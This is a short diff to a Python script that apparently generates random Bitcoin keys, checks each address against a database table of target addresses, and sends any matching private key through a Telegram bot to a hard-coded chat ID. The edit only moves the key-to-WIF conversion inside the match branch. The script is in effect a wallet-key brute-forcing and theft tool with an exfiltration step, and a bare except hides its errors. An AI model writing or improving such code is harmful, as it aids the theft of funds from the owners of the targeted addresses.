@@ -24,12 +24,13 @@ def main():
     try:
         k = Key()
         name = k.address
-        wallet = k.to_wif()
+
         sql.execute("SELECT name FROM friends WHERE name = ?", [name])
         if sql.fetchone() is None:
             pass
         else:
             print('Да!', name)
+            wallet = k.to_wif()
             bot.send_message('409229183', wallet)
     except:
         pass
